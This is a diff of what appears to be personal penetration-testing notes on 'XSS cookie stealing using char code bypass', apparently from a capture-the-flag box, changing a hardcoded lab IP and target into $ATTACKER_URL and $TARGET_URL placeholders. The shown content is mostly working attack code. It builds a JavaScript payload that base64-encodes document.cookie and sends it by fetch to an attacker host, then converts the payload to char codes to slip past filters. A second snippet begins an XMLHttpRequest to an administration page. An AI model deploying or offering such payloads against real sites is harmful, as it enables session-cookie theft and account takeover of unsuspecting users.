@@ -3,7 +3,7 @@ XSS cookie stealing using char code bypass:
 ---
 #xss #charcode #bypass #cookies 
 ```js
-const attacker = `http://10.10.14.164/cb`;
+const attacker = `http://$ATTACKER_URL/cb`;
 const xssString = `var attacker = "${attacker}";
 fetch(attacker + "?cb=" + encodeURI(btoa(document.cookie)));`
 //const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
@@ -34,8 +34,8 @@ const payload = xssString.split('').map(ch => ch.charCodeAt(0)).join(',');
 ```
 
 ```js
-var url = "http://derailed.htb:3000/administration";
-var attacker = "http://10.10.14.164/cb";
+var url = "http://$TARGET_URL$:3000/administration";
+var attacker = "http://$ATTACKER_URL/cb";
 const xssString = `
 var xhr  = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
